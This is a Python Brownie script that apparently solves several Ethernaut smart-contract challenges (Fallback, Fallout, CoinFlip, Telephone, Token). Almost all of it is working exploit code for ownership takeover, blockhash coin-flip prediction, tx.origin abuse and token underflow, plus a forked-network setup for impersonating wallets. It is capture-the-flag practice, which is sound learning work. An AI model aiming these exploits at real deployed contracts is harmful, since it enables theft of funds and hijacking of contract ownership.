from brownie import Fallback, Fallout, CoinFlip, CoinFlipAttacker, Telephone, TelephoneAttacker, TokenThing, network, config, accounts, Contract
from brownie.network.gas.strategies import GasNowStrategy
from brownie.network import gas_price
from scripts.helpful_scripts import *
from web3 import Web3
import time



def deploy_fallback():
    account = get_account()
    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        # if deploying locally, we want to use another account so we can try to escalate privs
        fallBack = Fallback.deploy({"from": accounts[1]}, publish_source=False)
    else:
        fallBackAddr = config["networks"][network.show_active()]["fallBack_address"]
        fallBack = Contract.from_abi("Fallback", fallBackAddr, Fallback.abi)

    print(f"Fallback deployed to {fallBack.address}")
    # now we attack
    attackFallback(fallBack, account)

def attackFallback(_fallBack, _account):

    contributions = _fallBack.getContribution({"from": _account})
    print(f"Before the attack...Current contributions: {contributions} Are we the owner?: {_fallBack.owner() == _account}")

    # adding .wait(1) shouldn't be necessary, but we're explicitly waiting for the block to be mined
    _fallBack.contribute({"value": 500000000000000, "from": _account}).wait(1)
    contributions = _fallBack.getContribution({"from": _account})
    print(f"Contributions now: {contributions}")
    _account.transfer(_fallBack.address,"0.01 ether").wait(1)
    owner = _fallBack.owner()
    areWeOwner = (owner == _account)
    print(f"Sent .01 ETH. Are we the owner?: {areWeOwner}")
    _fallBack.withdraw({"from":_account})
    print("Fallback attacked! Try submitting the solution as complete.")


def deploy_fallout():
    account = get_account()
    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        # if deploying locally, we want to use another account so we can try to escalate privs
        fallOut = Fallout.deploy({"from": accounts[1]}, publish_source=False)
    else:
        fallOutAddress = config["networks"][network.show_active()]["fallOut_address"]
        fallOut = Contract.from_abi("Fallout", fallOutAddress, Fallout.abi)

    print(f"Fallout deployed to {fallOut.address}")
    # now we attack
    attackFallout(fallOut, account)

def attackFallout(_fallOut, _account):
    print(f"Before the attack...are we the owner? {_account == _fallOut.owner()}")
    _fallOut.Fal1out({"from":_account, "value":0})
    print(f"After the attack...are we the owner? {_account == _fallOut.owner()}")
    print("Fallout attacked! Try submitting the solution as complete.")


def deploy_coinFlip():
    account = get_account()
    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        coinFlip = CoinFlip.deploy({"from": account}, publish_source=False)
    else:
        coinFlipAddress = config["networks"][network.show_active()]["coinFlip_address"]
        coinFlip = Contract.from_abi("CoinFlip", coinFlipAddress, CoinFlip.abi)

    attacker = CoinFlipAttacker.deploy(coinFlip.address, {"from": account}, publish_source=False)
    #network.gas_limit(6700000)
    for x in range(0, 10):
        attacker.guessFlip({"from": account}).wait(1)
        # for the life of me I could not figure out why it reverts as "gas estimation failed" on the 2nd iteration of guessFlip
        # testing with brownie console showed that it works fine when waiting for 30 seconds each iteration
        # I even tried looping from within CoinFlipAttacker, same error
        time.sleep(30)
    #attacker.tenGuesses()
    print("CoinFlip attacked! Try submitting the solution as complete.")

def deploy_telephone():
    account = get_account()
    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        telephone = Telephone.deploy({"from": accounts[1]}, publish_source=False)
    else:
        telephoneAddress = config["networks"][network.show_active()]["Telephone_address"]
        telephone = Contract.from_abi("Telephone", telephoneAddress, Telephone.abi)

    print(f"Before the attack...are we owner? {telephone.owner() == account.address}")
    attacker = TelephoneAttacker.deploy(telephone.address, {"from":account}, publish_source=False)
    print(f"After the attack...are we owner? {telephone.owner() == account.address}")
    print("Telephone attacked! Try submitting the solution as complete.")

def deploy_token():
    account = get_account()
    initSupply = ["100"]
    token = deploy_contract(TokenThing, "TokenThing", 1, initSupply)
    deployerAccount = config["networks"][network.show_active()].get("TokenThing_deployer")

    # this challenge gave me the opportunity to learn how to fork
    # we can test out stealing arbitrary wallets
    if network.show_active() in FORKED_LOCAL_ENVIRONMENTS:
        # if fork, set account as the 'player' address, which should already have 20 tokens
        tokenPlayerAddress = config["networks"][network.show_active()]["TokenThing_fork_wallet"]
        account = accounts.at(tokenPlayerAddress, force=True)
    elif network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        # if local, give ourselves 20 tokens to mirror the ethernaut site
        token.transfer(account.address, 20) 
        deployerAccount = accounts[1]

    
    attack_token(token, account, deployerAccount)

def attack_token(_token, _account, _deployerAccount):
    print(f"Before the attack...our balance is {_token.balanceOf(_account.address)}")
    _token.transfer(_deployerAccount, 21, {"from":_account})
    print(f"After the attack...our balance is {_token.balanceOf(_account.address)}")

    




def main():
    #deploy_fallback()
    #deploy_fallout()
    #deploy_coinFlip()
    #deploy_telephone()
    deploy_token()
